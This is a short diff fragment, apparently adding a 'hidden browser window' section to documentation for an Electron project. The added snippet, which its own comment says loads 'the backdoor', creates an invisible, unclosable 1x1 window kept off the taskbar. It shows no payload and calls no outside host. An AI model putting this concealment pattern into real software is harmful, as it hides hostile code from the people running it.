@@ -48,3 +48,19 @@ global shortcut
         }
     });
 ```
+hidden browser window
+---
+```js
+    // Create a hidden browser window which loads the backdoor.
+    mainWindow = new BrowserWindow({
+        width: 1,
+        height: 1,
+        show: false,
+        closable: false,
+        transparent: true,
+        resizable: false,
+        skipTaskbar: true
+    });
+
+    mainWindow.loadURL(`file://${__dirname}/index.html`);
+```
